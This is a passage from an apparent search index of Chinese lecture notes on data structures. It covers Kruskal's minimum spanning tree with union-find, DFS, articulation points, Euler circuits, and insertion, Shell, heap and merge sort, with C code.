S[Root1] += S[Root2];     /* \u96c6\u54082\u5e76\u5165\u96c6\u54081  */\n        S[Root2] = Root1;\n    }\n}\n\nSetName Find( SetType S, ElementType X )\n{ /* \u9ed8\u8ba4\u96c6\u5408\u5143\u7d20\u5168\u90e8\u521d\u59cb\u5316\u4e3a-1 */\n    if ( S[X] &lt; 0 ) /* \u627e\u5230\u96c6\u5408\u7684\u6839 */\n        return X;\n    else\n        return S[X] = Find( S, S[X] ); /* \u8def\u5f84\u538b\u7f29 */\n}\n\nbool CheckCycle( SetType VSet, Vertex V1, Vertex V2 )\n{ /* \u68c0\u67e5\u8fde\u63a5V1\u548cV2\u7684\u8fb9\u662f\u5426\u5728\u73b0\u6709\u7684\u6700\u5c0f\u751f\u6210\u6811\u5b50\u96c6\u4e2d\u6784\u6210\u56de\u8def */\n    Vertex Root1, Root2;\n\n    Root1 = Find( VSet, V1 ); /* \u5f97\u5230V1\u6240\u5c5e\u7684\u8fde\u901a\u96c6\u540d\u79f0 */\n    Root2 = Find( VSet, V2 ); /* \u5f97\u5230V2\u6240\u5c5e\u7684\u8fde\u901a\u96c6\u540d\u79f0 */\n\n    if( Root1==Root2 ) /* \u82e5V1\u548cV2\u5df2\u7ecf\u8fde\u901a\uff0c\u5219\u8be5\u8fb9\u4e0d\u80fd\u8981 */\n        return false;\n    else { /* \u5426\u5219\u8be5\u8fb9\u53ef\u4ee5\u88ab\u6536\u96c6\uff0c\u540c\u65f6\u5c06V1\u548cV2\u5e76\u5165\u540c\u4e00\u8fde\u901a\u96c6 */\n        Union( VSet, Root1, Root2 );\n        return true;\n    }\n}\n/*-------------------- \u5e76\u67e5\u96c6\u5b9a\u4e49\u7ed3\u675f --------------------*/\n\n/*-------------------- \u8fb9\u7684\u6700\u5c0f\u5806\u5b9a\u4e49 --------------------*/\nvoid PercDown( Edge ESet, int p, int N )\n{ /* \u6539\u7f16\u4ee3\u78014.24\u7684PercDown( MaxHeap H, int p )    */\n/* \u5c06N\u4e2a\u5143\u7d20\u7684\u8fb9\u6570\u7ec4\u4e2d\u4ee5ESet[p]\u4e3a\u6839\u7684\u5b50\u5806\u8c03\u6574\u4e3a\u5173\u4e8eWeight\u7684\u6700\u5c0f\u5806 */\n    int Parent, Child;\n    struct ENode X;\n\n    X = ESet[p]; /* \u53d6\u51fa\u6839\u7ed3\u70b9\u5b58\u653e\u7684\u503c */\n    for( Parent=p; (Parent*2+1)&lt;N; Parent=Child ) {\n        Child = Parent * 2 + 1;\n        if( (Child!=N-1) &amp;&amp; (ESet[Child].Weight&gt;ESet[Child+1].Weight) )\n            Child++;  /* Child\u6307\u5411\u5de6\u53f3\u5b50\u7ed3\u70b9\u7684\u8f83\u5c0f\u8005 */\n        if( X.Weight &lt;= ESet[Child].Weight ) break; /* \u627e\u5230\u4e86\u5408\u9002\u4f4d\u7f6e */\n        else  /* \u4e0b\u6ee4X */\n            ESet[Parent] = ESet[Child];\n    }\n    ESet[Parent] = X;\n}\n\nvoid InitializeESet( LGraph Graph, Edge ESet )\n{ /* \u5c06\u56fe\u7684\u8fb9\u5b58\u5165\u6570\u7ec4ESet\uff0c\u5e76\u4e14\u521d\u59cb\u5316\u4e3a\u6700\u5c0f\u5806 */\n    Vertex V;\n    PtrToAdjVNode W;\n    int ECount;\n\n    /* \u5c06\u56fe\u7684\u8fb9\u5b58\u5165\u6570\u7ec4ESet */\n    ECount = 0;\n    for ( V=0; V&lt;Graph-&gt;Nv; V++ )\n        for ( W=Graph-&gt;G[V].FirstEdge; W; W=W-&gt;Next )\n            if ( V &lt; W-&gt;AdjV ) { /* \u907f\u514d\u91cd\u590d\u5f55\u5165\u65e0\u5411\u56fe\u7684\u8fb9\uff0c\u53ea\u6536V1&lt;V2\u7684\u8fb9 */\n                ESet[ECount].V1 = V;\n                ESet[ECount].V2 = W-&gt;AdjV;\n                ESet[ECount++].Weight = W-&gt;Weight;\n            }\n    /* \u521d\u59cb\u5316\u4e3a\u6700\u5c0f\u5806 */\n    for ( ECount=Graph-&gt;Ne/2; ECount&gt;=0; ECount-- )\n        PercDown( ESet, ECount, Graph-&gt;Ne );\n}\n\nint GetEdge( Edge ESet, int CurrentSize )\n{ /* \u7ed9\u5b9a\u5f53\u524d\u5806\u7684\u5927\u5c0fCurrentSize\uff0c\u5c06\u5f53\u524d\u6700\u5c0f\u8fb9\u4f4d\u7f6e\u5f39\u51fa\u5e76\u8c03\u6574\u5806 */\n\n    /* \u5c06\u6700\u5c0f\u8fb9\u4e0e\u5f53\u524d\u5806\u7684\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\u7684\u8fb9\u4ea4\u6362 */\n    Swap( &amp;ESet[0], &amp;ESet[CurrentSize-1]);\n    /* \u5c06\u5269\u4e0b\u7684\u8fb9\u7ee7\u7eed\u8c03\u6574\u6210\u6700\u5c0f\u5806 */\n    PercDown( ESet, 0, CurrentSize-1 );\n\n    return CurrentSize-1; /* \u8fd4\u56de\u6700\u5c0f\u8fb9\u6240\u5728\u4f4d\u7f6e */\n}\n/*-------------------- \u6700\u5c0f\u5806\u5b9a\u4e49\u7ed3\u675f --------------------*/\n\nint Kruskal( LGraph Graph, LGraph MST )\n{ /* \u5c06\u6700\u5c0f\u751f\u6210\u6811\u4fdd\u5b58\u4e3a\u90bb\u63a5\u8868\u5b58\u50a8\u7684\u56feMST\uff0c\u8fd4\u56de\u6700\u5c0f\u6743\u91cd\u548c */\n    WeightType TotalWeight;\n    int ECount, NextEdge;\n    SetType VSet; /* \u9876\u70b9\u6570\u7ec4 */\n    Edge ESet;    /* \u8fb9\u6570\u7ec4 */\n\n    InitializeVSet( VSet, Graph-&gt;Nv ); /* \u521d\u59cb\u5316\u9876\u70b9\u5e76\u67e5\u96c6 */\n    ESet = (Edge)malloc( sizeof(struct ENode)*Graph-&gt;Ne );\n    InitializeESet( Graph, ESet ); /* \u521d\u59cb\u5316\u8fb9\u7684\u6700\u5c0f\u5806 */\n    /* \u521b\u5efa\u5305\u542b\u6240\u6709\u9876\u70b9\u4f46\u6ca1\u6709\u8fb9\u7684\u56fe\u3002\u6ce8\u610f\u7528\u90bb\u63a5\u8868\u7248\u672c */\n    MST = CreateGraph(Graph-&gt;Nv);\n    TotalWeight = 0; /* \u521d\u59cb\u5316\u6743\u91cd\u548c     */\n    ECount = 0;      /* \u521d\u59cb\u5316\u6536\u5f55\u7684\u8fb9\u6570 */\n\n    NextEdge = Graph-&gt;Ne; /* \u539f\u59cb\u8fb9\u96c6\u7684\u89c4\u6a21 */\n    while ( ECount &lt; Graph-&gt;Nv-1 ) {  /* \u5f53\u6536\u96c6\u7684\u8fb9\u4e0d\u8db3\u4ee5\u6784\u6210\u6811\u65f6 */\n        NextEdge = GetEdge( ESet, NextEdge ); /* \u4ece\u8fb9\u96c6\u4e2d\u5f97\u5230\u6700\u5c0f\u8fb9\u7684\u4f4d\u7f6e */\n        if (NextEdge &lt; 0) /* \u8fb9\u96c6\u5df2\u7a7a */\n            break;\n        /* \u5982\u679c\u8be5\u8fb9\u7684\u52a0\u5165\u4e0d\u6784\u6210\u56de\u8def\uff0c\u5373\u4e24\u7aef\u7ed3\u70b9\u4e0d\u5c5e\u4e8e\u540c\u4e00\u8fde\u901a\u96c6 */\n        if ( CheckCycle( VSet, ESet[NextEdge].V1, ESet[NextEdge].V2 )==true ) {\n            /* \u5c06\u8be5\u8fb9\u63d2\u5165MST */\n            InsertEdge( MST, ESet+NextEdge );\n            TotalWeight += ESet[NextEdge].Weight; /* \u7d2f\u8ba1\u6743\u91cd */\n            ECount++; /* \u751f\u6210\u6811\u4e2d\u8fb9\u6570\u52a01 */\n        }\n    }\n    if ( ECount &lt; Graph-&gt;Nv-1 )\n        TotalWeight = -1; /* \u8bbe\u7f6e\u9519\u8bef\u6807\u8bb0\uff0c\u8868\u793a\u751f\u6210\u6811\u4e0d\u5b58\u5728 */\n\n    return TotalWeight;\n}\n</code></pre>"}, {"location": "Course/FDS/Lec04/#dfs", "title": "\u6df1\u5ea6\u4f18\u5148\u641c\u7d22 | DFS", "text": "<pre><code>void DFS ( Vertex V )  /* this is only a template */\n{   \n    visited[ V ] = true;  /* mark this vertex to avoid cycles */\n    for ( each W adjacent to V )\n        if ( !visited[ W ] )\n            DFS( W );\n} /* T = O( |E| + |V| ) as long as adjacency lists are used */\n</code></pre> <p>\u662f\u5148\u5e8f\u904d\u5386\u7684\u4e00\u79cd\u63a8\u5e7f</p>"}, {"location": "Course/FDS/Lec04/#binconnectivity", "title": "\u53cc\u8fde\u901a | Binconnectivity", "text": "<ul> <li>\u82e5\u4e00\u4e2a\u56fe\u4e0d\u662f\u53cc\u8fde\u901a\u7684\uff0c\u90a3\u4e48\u5c06\u5176\u5220\u9664\u540e\u56fe\u4e0d\u518d\u8fde\u901a\u7684\u9876\u70b9\u53eb\u505a\u5272\u70b9 (articulation point)</li> <li>\u82e5\u4e00\u4e2a\u8fde\u901a\u7684\u65e0\u5411\u56fe\u4e2d\u7684\u4efb\u4e00\u9876\u70b9\u5220\u9664\u540e\uff0c\u5269\u4e0b\u7684\u56fe\u4ecd\u7136\u8fde\u901a (\u5373\u8fde\u901a\u4e14\u65e0\u5272\u70b9) \uff0c\u5219\u79f0\u5176\u4e3a\u53cc\u8fde\u901a</li> <li>\u53cc\u8fde\u901a\u5206\u91cf (biconnected component) \u662f\u6781\u5927\u7684\u53cc\u8fde\u901a\u5b50\u56fe</li> </ul> \u5177\u6709\u5272\u70b9 C \u548c D \u7684\u56fe <ul> <li> <p>Tarjan\u7b97\u6cd5</p> \u5bf9\u9876\u70b9\u7684 Num \u8d4b\u503c\u4f8b\u7a0b <pre><code>/* Assign Num and compute Parents */\nvoid AssignNum(Vertex V)\n{\n    Vertex W;\n    Num[V] = Counter ++;\n    Visited[V] = True;\n    for each W adjacent to V\n        if(!Visited[W])\n        {\n            Parent[W] = V;\n            AssignNum(W);\n        }\n}\n</code></pre> \u901a\u8fc7 DFS \u5efa\u7acb\u7684\u6700\u5c0f\u751f\u6210\u6811 <p> </p> <p>back edge: ( \\(u, v\\) ) \\(\\notin\\) tree and \\(u\\) (or \\(v\\) ) is an ancestor of \\(v\\) (or \\(u\\) ) Note: If \\(u\\) is an ancestor of \\(v\\) , then Num( \\(u\\) ) &lt; Num( \\(v\\) )</p> <ul> <li>Num[v] \u8868\u793a v \u7b2c\u4e00\u6b21\u88ab\u8bbf\u95ee\u7684\u65f6\u95f4\u6233\uff0c\u5373 DFS \u65f6\u7b2c\u51e0\u4e2a\u88ab\u8bbf\u95ee\uff08\u4ece0\u5f00\u59cb\uff09</li> <li>\u8ffd\u6eaf\u503c low[x]<ul> <li>\u5bf9\u4e8e\u56fe\u4e2d\u4ece x \u5230 y \u7684\u8fb9 : </li> <li>\u5982\u679c &lt; x, y &gt; \u5728\u6811\u4e0a\uff0c\u5219 low[x] = min(Num[x], low[y])</li> <li>\u5982\u679c &lt; x, y &gt; \u4e0d\u5728\u6811\u4e0a\uff0c\u5219 low[x] = min(Num[x], Num[y])</li> </ul> </li> <li>\u5bfb\u627e\u5272\u70b9\uff1a<ul> <li>\u5982\u679c u \u662f root\uff0c\u5219 u \u662f\u5272\u70b9\u5f53\u4e14\u4ec5\u5f53 u \u6709\u81f3\u5c11\u4e24\u4e2a\u513f\u5b50</li> <li>\u5982\u679c u \u4e0d\u662f root\uff0c\u5219 u \u662f\u5272\u70b9\u5f53\u4e14\u4ec5\u5f53\u5b58\u5728\u4e00\u4e2a\u513f\u5b50 v\uff0c\u6ee1\u8db3 Num[u] \\(\\leq\\) low[v]</li> </ul> </li> <li>\u8ba1\u7b97 Low \u5e76\u68c0\u9a8c\u662f\u5426\u5272\u70b9 (\u5ffd\u7565\u5bf9\u6839\u7684\u68c0\u9a8c)  <pre><code>/* Assign Low; also check for articulation points */\nvoid AssignLow(Vertex V)\n{\n    Vertex W;\n\n    Low[V] = Num[V];    /* Rule 1 */\n    for each W adjacent to V\n    {\n        if(Num[W] &gt; Num[V]) /* Forward edge */\n        {\n            AssignLow(W);\n            if(Low[W] &gt;= Num[V])\n                printf(\"%v is an articulation point\\n\", v);\n            Low[V] = Min(Low[V], Low[W]);\n        }\n        else if(Parent[V] != W) /* Back edge */\n            Low[V] = Min(Low[V], Num[W]);   /* Rule 2 */\n\n    }\n}\n</code></pre></li> <li>\u5728\u4e00\u6b21 DFS \u4e2d\u5bf9\u5272\u70b9\u7684\u68c0\u6d4b (\u5ffd\u7565\u5bf9\u6839\u7684\u68c0\u6d4b) <pre><code>void FindArt(Vertex V)\n{\n    Vertex W;\n    Visited[V] = True;\n    Low[V] = Num[V] = Counter ++;\n    for(each W adjacent to V)\n    {\n        if(!Visited[W])\n        {\n            Parent[W] = V;\n            FindArt(W);\n            if(Low[W] &gt;= Num[V])\n            {\n                printf(\"%v is an articulation point\\n\", v);\n            }\n            Low[V] = Min(Low[V], Low[W]);\n        }\n        else\n            if(Parent[V] != W)\n            {\n                Low[V] = Min(Low[V], Num[W]);\n            }\n    }\n}\n</code></pre></li> </ul> </li> </ul>"}, {"location": "Course/FDS/Lec04/#_10", "title": "\u6b27\u62c9\u56de\u8def &amp; \u6b27\u62c9\u8def\u5f84", "text": "<ul> <li>\u6b27\u62c9\u8def\u5f84 (Euler path | Euler tour) \u2014\u2014 \u4e00\u7b14\u753b | \u5305\u542b\u6240\u6709\u8fb9\u7684\u7b80\u5355\u8def\u5f84<ul> <li>\u5982\u679c\u6b63\u597d\u6709\u4e24\u4e2a\u5ea6\u4e3a\u5947\u6570\u7684\u9876\u70b9\uff0c\u6b27\u62c9\u8def\u5f84\u5c31\u662f\u53ef\u80fd\u7684\u3002\u5fc5\u987b\u4ece\u4e00\u4e2a\u5947\u5ea6\u7684\u9876\u70b9\u5f00\u59cb \u201c\u753b\u201d</li> </ul> </li> <li>\u6b27\u62c9\u56de\u8def (Euler circuit) \u2014\u2014 \u4e00\u7b14\u753b\u5e76\u4e14\u7ed3\u675f\u70b9\u548c\u8d77\u59cb\u70b9\u91cd\u5408 | \u5305\u542b\u6240\u6709\u8fb9\u7684\u7b80\u5355\u73af<ul> <li>\u53ea\u6709\u5f53\u56fe\u8fde\u901a\u4e14\u6bcf\u4e2a\u9876\u70b9\u5ea6\u4e3a\u5076\u6570\uff0c\u6b27\u62c9\u56de\u8def\u624d\u6709\u53ef\u80fd</li> </ul> </li> <li>\u5bf9\u65e0\u5411\u56fe<ul> <li>\u6b27\u62c9\u56de\u8def\u7684\u5224\u5b9a: \u56fe\u8fde\u901a\u4e14\u6240\u6709\u9876\u70b9\u7684\u5ea6\u4e3a\u5076\u6570</li> <li>\u6b27\u62c9\u8def\u5f84\u7684\u5224\u5b9a: \u56fe\u8fde\u901a\u4e14\u6709\u4e14\u4ec5\u6709\u4e24\u4e2a\u9876\u70b9\u7684\u5ea6\u6570\u662f\u5947\u6570</li> </ul> </li> <li>\u6709\u5411\u56fe<ul> <li>\u6b27\u62c9\u56de\u8def\u7684\u5224\u5b9a: \u5f31\u8fde\u901a\u4e14\u6240\u6709\u9876\u70b9\u7684\u51fa\u5ea6\u7b49\u4e8e\u5165\u5ea6</li> <li>\u6b27\u62c9\u8def\u5f84\u7684\u5224\u5b9a: \u5f31\u8fde\u901a\u4e14\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u9876\u70b9\u7684\u51fa\u5ea6\u6bd4\u5165\u5ea6\u5927 1 \u53ca\u4e00\u4e2a\u9876\u70b9\u7684\u5165\u5ea6\u6bd4\u51fa\u5ea6\u5927 1\uff0c\u5176\u4f59\u9876\u70b9\u7684\u51fa\u5ea6\u7b49\u4e8e\u5165\u5ea6 <p>\u5f31\u8fde\u901a \u2014\u2014 \u5c06\u6709\u5411\u56fe\u7684\u6240\u6709\u6709\u5411\u8fb9\u66ff\u6362\u4e3a\u65e0\u5411\u8fb9\u5f97\u5230\u7684\u56fe\u662f\u8fde\u901a</p> </li> </ul> </li> <li>DFS \u904d\u5386\u6574\u5f20\u56fe\u5373\u53ef\u6c42\u5f97\u8def\u5f84</li> </ul>"}, {"location": "Course/FDS/Lec05/", "title": "\u6392\u5e8f | Sort", "text": "<p> \u7ea6 1698 \u4e2a\u5b57  395 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"}, {"location": "Course/FDS/Lec05/#_1", "title": "\u7b80\u5355\u6392\u5e8f", "text": "<p>\u9884\u5907\u77e5\u8bc6</p> <p><code>void XSort(ElementType A[], int N)</code></p> <ol> <li>\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4e3a\u7b80\u5355\u8d77\u89c1\uff0c\u8ba8\u8bba\u4ece\u5c0f\u5230\u5927\u7684\u6574\u6570\u6392\u5e8f</li> <li>N\u662f\u6b63\u6574\u6570</li> <li>\u53ea\u8ba8\u8bba\u57fa\u4e8e\u6bd4\u8f83\u7684\u6392\u5e8f\uff08&gt; = &lt; \u6709\u5b9a\u4e49\uff09</li> <li>\u53ea\u8ba8\u8bba\u5185\u90e8\u6392\u5e8f</li> <li>\u7a33\u5b9a\u6027\uff1a\u4efb\u610f\u4e24\u4e2a\u76f8\u7b49\u7684\u6570\u636e\uff0c\u6392\u5e8f\u524d\u540e\u7684\u76f8\u5bf9\u4f4d\u7f6e\u4e0d\u53d1\u751f\u6539\u53d8</li> <li>\u6ca1\u6709\u4e00\u79cd\u6392\u5e8f\u662f\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u8868\u73b0\u6700\u597d\u7684</li> </ol> <ul> <li> <p>\u63d2\u5165\u6392\u5e8f</p> <p>code</p> <pre><code>void InsertionSort( ElementType A[], int N )\n{ \n    int P, i;\n    ElementType Tmp;\n    for(P = 1; P &lt; N; P++) \n    {\n        Tmp = A[P];     /* \u53d6\u51fa\u672a\u6392\u5e8f\u5e8f\u5217\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20*/\n        for(i = P; i &gt; 0 &amp;&amp; A[i-1] &gt; Tmp; i--)\n            A[i] = A[i-1];  /*\u4f9d\u6b21\u4e0e\u5df2\u6392\u5e8f\u5e8f\u5217\u4e2d\u5143\u7d20\u6bd4\u8f83\u5e76\u53f3\u79fb*/\n        A[i] = Tmp;     /* \u653e\u8fdb\u5408\u9002\u7684\u4f4d\u7f6e */\n    }\n}\n</code></pre> <ul> <li>\u6700\u597d\u60c5\u51b5: \u8f93\u5165 A[] \u662f\u6709\u5e8f\u7684, \\(T(N) = O(N)\\)</li> <li>\u6700\u574f\u60c5\u51b5: \u8f93\u5165 A[] \u662f\u9006\u5e8f\u7684, \\(T(N) = O(N^2)\\)</li> </ul> </li> </ul> \u5f15\u7533\u2013\u65f6\u95f4\u590d\u6742\u5ea6\u4e0b\u754c <ul> <li>\u5bf9\u4e8e\u4e0b\u6807 i &lt; j, \u5982\u679c A[i] &gt; A[j], \u5219\u79f0 (i, j) \u662f\u4e00\u5bf9\u9006\u5e8f\u5bf9 (inversion)</li> <li>\u5192\u6ce1\u548c\u63d2\u5165\u6392\u5e8f\u6bcf\u6b21\u4ea4\u6362\u4e24\u4e2a\u76f8\u90bb\u5143\u7d20\u90fd\u6b63\u597d\u6d88\u53bb\u4e00\u4e2a\u9006\u5e8f\u5bf9<ul> <li>\u63d2\u5165\u6392\u5e8f: \\(T(N, I) = O(N + I)\\)</li> <li>\u5176\u4e2d I \u662f\u539f\u59cb\u5e8f\u5217\u4e2d\u9006\u5e8f\u5bf9\u7684\u6570\u91cf</li> </ul> </li> <li>\u5b9a\u7406:<ul> <li>\u4efb\u610f N \u4e2a\u4e0d\u540c\u5143\u7d20\u7ec4\u6210\u7684\u5e8f\u5217\u5e73\u5747\u5177\u6709 \\(\\frac{N\uff08N-1\uff09}{4}\\) \u4e2a\u9006\u5e8f\u5bf9</li> <li>\u4efb\u4f55\u4ec5\u4ee5\u4ea4\u6362\u76f8\u90bb\u5143\u7d20\u6765\u6392\u5e8f\u7684\u7b97\u6cd5\uff0c\u5176\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(\\Omega (N^2)\\) ( \\(\\Omega\\) \u6307\u7684\u662f\u4e0b\u754c)</li> </ul> </li> </ul> <p>\u8981\u63d0\u9ad8\u7b97\u6cd5\u6548\u7387\uff0c\u9700\u8981   1. \u6bcf\u6b21\u6d88\u53bb\u4e0d\u6b62\u4e00\u5bf9\u9006\u5e8f\u5bf9   2. \u6bcf\u6b21\u5c3d\u91cf\u4ea4\u6362\u76f8\u9694\u8f83\u8fdc\u7684\u5143\u7d20</p>"}, {"location": "Course/FDS/Lec05/#shell-sort", "title": "\u5e0c\u5c14\u6392\u5e8f | Shell Sort", "text": "<p>Abstract</p> <ul> <li>\u5b9a\u4e49\u589e\u91cf\u5e8f\u5217 \\(h_t &gt; h_{t-1} &gt; \u00b7\u00b7\u00b7 &gt; h_1 = 1\\)</li> <li>\u5bf9\u6bcf\u4e2a \\(h_t\\) \u8fdb\u884c \u201c\\(h_t\\) -\u95f4\u9694\u201d \u6392\u5e8f </li> </ul> <p>\u201c\\(h_t\\) -\u95f4\u9694\u201d \u6709\u5e8f\u7684\u5e8f\u5217\uff0c\u5728\u6267\u884c \u201c\\(h_{t-1}\\) -\u95f4\u9694\u201d \u6392\u5e8f\u540e\uff0c\u4ecd\u7136\u662f \u201c\\(h_t\\) -\u95f4\u9694\u201d \u6709\u5e8f\u7684</p>"}, {"location": "Course/FDS/Lec05/#_2", "title": "\u5e0c\u5c14\u589e\u91cf\u5e8f\u5217", "text": "<ul> <li>\\(h_t = \\lfloor N / 2\\rfloor\\) , \\(h_k = \\lfloor h_k+1 / 2 \\rfloor\\) </li> <li>\u6700\u574f\u60c5\u51b5: \u53ea\u5728 1-sort \u6392\u5e8f, \\(T(N) = O(N^2)\\)</li> </ul> <pre><code>void Shellsort( ElementType A[ ], int N ) \n{ \n    int  i, j, Increment; \n    ElementType  Tmp; \n    for( Increment = N / 2; Increment &gt; 0; Increment /= 2 )  \n        /*h sequence */\n        for( i = Increment; i &lt; N; i++ ) \n        { /* insertion sort */\n            Tmp = A[ i ]; \n            for ( j = i; j &gt;= Increment; j - = Increment ) \n                if( Tmp &lt; A[ j - Increment ] ) \n                    A[ j ] = A[ j - Increment ]; \n                else \n                    break; \n            A[ j ] = Tmp; \n        } /* end for-I and for-Increment loops */\n}\n</code></pre>"}, {"location": "Course/FDS/Lec05/#_3", "title": "\u66f4\u591a\u589e\u91cf\u5e8f\u5217", "text": "<p>Question</p> <p>\u5f53\u589e\u91cf\u5143\u7d20\u4e0d\u4e92\u8d28\u65f6\uff0c\u5bfc\u81f4\u5c0f\u589e\u91cf\u53ef\u80fd\u4e0d\u8d77\u4f5c\u7528, \u5982: </p> <ol> <li>Hibbard \u589e\u91cf\u5e8f\u5217<ol> <li>\\(h_k = 2^k - 1\\) \u2014\u2014 \u76f8\u90bb\u5143\u7d20\u4e92\u8d28</li> <li>\u6700\u574f\u60c5\u51b5: \\(T(N) = \\Theta (N^{3/2})\\)</li> <li>\u731c\u60f3: \\(T_{avg}(N) =O(N^{5/4})\\)</li> </ol> </li> <li>Sedgewick \u589e\u91cf\u5e8f\u5217 \u2014\u2014  { 1\uff0c5\uff0c19\uff0c41\uff0c109\uff0c\u00b7\u00b7\u00b7 }<ol> <li>\\(9\\times 4^i - 9\\times 2^i + 1\\) \u6216 \\(4^i - 3\\times 2^i + 1\\) </li> <li>\u731c\u60f3: \\(T_{avg}(N) = O(N^{7/6})\\), \\(T_{worst}(N) = O(N^{4/3})\\) </li> </ol> </li> </ol> <p>\u5f53\u5143\u7d20\u6570\u91cf\u8f83\u5927\u65f6\uff0c\u91c7\u7528\u5e0c\u5c14\u6392\u5e8f + Sedgewick \u589e\u91cf\u5e8f\u5217\u8f83\u4e3a\u9ad8\u6548</p>"}, {"location": "Course/FDS/Lec05/#_4", "title": "\u5806\u6392\u5e8f", "text": "<ul> <li>\u4f7f\u7528\u5806\u7ed3\u6784\u6392\u5e8f</li> <li>\u7b97\u6cd5\u4e00: \u5c06\u5143\u7d20\u63d2\u5165\u5806\u4e2d\u518d\u4f9d\u6b21 DeleteMin <pre><code>void Heap_Sort(ElementType A[], int N)\n{\n    int i;\n    BuildHeap(A);   /* O(N) */\n    for(i = 0; i &lt; N; i++)\n    {\n        TempA[i] = DeleteMin(A);    /* O(logN) */\n    }\n    for(i = 0; i &lt; N; i++)  /* O(N) */\n    {\n        A[i] = TempA[i];\n    }\n}\n</code></pre><ul> <li>\\(T(N) = O(N logN)\\)</li> <li>\u4f46\u9700\u8981\u989d\u5916\u7684 \\(O(N)\\) \u7a7a\u95f4\uff0c\u5e76\u4e14\u590d\u5236\u5143\u7d20\u9700\u8981\u65f6\u95f4</li> </ul> </li> <li>\u7b97\u6cd5\u4e8c: \u4ee5\u7ebf\u6027\u65f6\u95f4\u5efa\u7acb\u5806(Percolate), \u518d\u5faa\u73af\u5c06\u5806\u9876\u5143\u7d20\u4e0e\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362\u518d Percolate<ul> <li>\u4ee5\u6700\u5927\u5806\u4e3a\u4f8b: <pre><code>void Heap_Sort(ElementType A[], int N)\n{\n    for(i = N/2; i &gt;= 0; i--)   /* BuildHeap */\n    {\n        PercDown(A, i, N);\n    }\n    for(i = N-1; i &gt; 0; i--)    /* \u76f8\u5f53\u4e8e DeleteMax */\n    {\n        Swap(&amp;A[0], &amp;A[i]);\n        PercDown(A, 0, i);\n    }\n}\n</code></pre></li> </ul> </li> <li>\u5806\u6392\u5e8f\u5904\u7406 N \u4e2a\u4e0d\u540c\u5143\u7d20\u7684\u968f\u673a\u6392\u5217\u7684\u5e73\u5747\u6bd4\u8f83\u6b21\u6570\u4e3a \\(2NlogN - O(NloglogN)\\) </li> </ul> <p>\u867d\u7136\u5806\u6392\u5e8f\u7ed9\u51fa\u6700\u4f73\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u4f46\u5b9e\u9645\u6548\u679c\u4e0d\u5982\u5e0c\u5c14\u6392\u5e8f + Sedgewick \u589e\u91cf</p> \u8865\u5168\u51fd\u6570 <pre><code>void Swap( ElementType *a, ElementType *b )\n{\n    ElementType t = *a; *a = *b; *b = t;\n}\n\nvoid PercDown( ElementType A[], int p, int N )\n{ \n/* \u5c06N\u4e2a\u5143\u7d20\u7684\u6570\u7ec4\u4e2d\u4ee5A[p]\u4e3a\u6839\u7684\u5b50\u5806\u8c03\u6574\u4e3a\u6700\u5927\u5806 */\n    int Parent, Child;\n    ElementType X;\n\n    X = A[p]; /* \u53d6\u51fa\u6839\u7ed3\u70b9\u5b58\u653e\u7684\u503c */\n    for( Parent=p; (Parent*2+1)&lt;N; Parent=Child ) {\n        Child = Parent * 2 + 1;\n        if( (Child!=N-1) &amp;&amp; (A[Child]&lt;A[Child+1]) )\n            Child++;  /* Child\u6307\u5411\u5de6\u53f3\u5b50\u7ed3\u70b9\u7684\u8f83\u5927\u8005 */\n        if( X &gt;= A[Child] ) break; /* \u627e\u5230\u4e86\u5408\u9002\u4f4d\u7f6e */\n        else  /* \u4e0b\u6ee4X */\n            A[Parent] = A[Child];\n    }\n    A[Parent] = X;\n}\n</code></pre>"}, {"location": "Course/FDS/Lec05/#_5", "title": "\u5f52\u5e76\u6392\u5e8f", "text": "<ul> <li>\u5173\u952e\u662f\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5217\u8868\u53d8\u6210\u4e00\u4e2a\u6709\u5e8f\u5217\u8868 (\u53ef\u4ee5\u9012\u5f52\u8fdb\u884c\u3001\u5206\u800c\u6cbb\u4e4b)</li> <li>\u9012\u5f52\u7b97\u6cd5: <ul> <li>\u5206\u800c\u6cbb\u4e4b  </li> <li>\\(T(N) = T(N/2) + T(N/2) + O(N)\\) \\(\\rightarrow\\) \\(T(N) = O(NlogN)\\)</li> </ul> code <pre><code>/* L = \u5de6\u8fb9\u8d77\u59cb\u4f4d\u7f6e, R = \u53f3\u8fb9\u8d77\u59cb\u4f4d\u7f6e, RightEnd = \u53f3\u8fb9\u7ec8\u70b9\u4f4d\u7f6e*/\nvoid Merge( ElementType A[], ElementType TmpA[], int L, int R, int RightEnd )\n{ /* \u5c06\u6709\u5e8f\u7684A[L]~A[R-1]\u548cA[R]~A[RightEnd]\u5f52\u5e76\u6210\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217 */\n    int LeftEnd, NumElements, Tmp;\n    int i;\n\n    LeftEnd = R - 1; /* \u5de6\u8fb9\u7ec8\u70b9\u4f4d\u7f6e */\n    Tmp = L;         /* \u6709\u5e8f\u5e8f\u5217\u7684\u8d77\u59cb\u4f4d\u7f6e */\n    NumElements = RightEnd - L + 1;\n\n    while( L &lt;= LeftEnd &amp;&amp; R &lt;= RightEnd ) {\n        if ( A[L] &lt;= A[R] )\n            TmpA[Tmp++] = A[L++]; /* \u5c06\u5de6\u8fb9\u5143\u7d20\u590d\u5236\u5230TmpA */\n        else\n            TmpA[Tmp++] = A[R++]; /* \u5c06\u53f3\u8fb9\u5143\u7d20\u590d\u5236\u5230TmpA */\n    }\n\n    while( L &lt;= LeftEnd )\n        TmpA[Tmp++] = A[L++]; /* \u76f4\u63a5\u590d\u5236\u5de6\u8fb9\u5269\u4e0b\u7684 */\n    while( R &lt;= RightEnd )\n        TmpA[Tmp++] = A[R++]; /* \u76f4\u63a5\u590d\u5236\u53f3\u8fb9\u5269\u4e0b\u7684 */\n\n    for( i = 0; i &lt; NumElements; i++, RightEnd -- )\n        A[RightEnd] = TmpA[RightEnd]; /* \u5c06\u6709\u5e8f\u7684TmpA[]\u590d\u5236\u56deA[] */\n}\n\nvoid Msort( ElementType A[], ElementType 